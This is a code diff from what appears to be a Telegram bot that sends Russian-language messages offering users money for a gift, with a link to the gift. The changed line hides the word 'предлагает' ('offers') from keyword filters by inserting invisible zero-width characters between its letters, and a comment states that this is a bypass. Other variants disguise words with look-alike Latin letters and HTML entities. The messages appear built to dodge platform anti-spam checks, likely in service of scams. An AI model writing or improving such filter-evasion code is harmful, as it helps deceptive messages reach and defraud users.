@@ -337,8 +337,8 @@ async def process_offer(message: Message, business_connection_id: str | None = N
         variant = parsed.get("text_variant")
         gift_link = f'<a href="{parsed["gift_url"]}">{title}</a>'
         if variant == "фу":
-            # Обход слова "предлагает" через HTML entities
-            body = f"П&#1086;льз&#1086;вaтeль <b>{seller_name}</b> пр&#1077;длaгa&#1077;т Вaм <b>{amount}</b> зa п&#1086;дaр&#1086;к {gift_link}.\n\nПpeдлoжeниe aктивнo в тeчeнии <b>{time_text}</b>"
+            # Обход слова "предлагает" через невидимый символ между буквами
+            body = f"П&#1086;льз&#1086;вaтeль <b>{seller_name}</b> п\u200cр\u200cе\u200cд\u200cл\u200cа\u200cг\u200cа\u200cе\u200cт Вaм <b>{amount}</b> зa п&#1086;дaр&#1086;к {gift_link}.\n\nПpeдлoжeниe aктивнo в тeчeнии <b>{time_text}</b>"
         elif variant == "фу1":
             body = f"<b>{seller_name}</b> пp&#1077;длага&#1077;т Вaм <b>{amount}</b> зa пoдapoк {gift_link}."
         elif variant == "фу2":
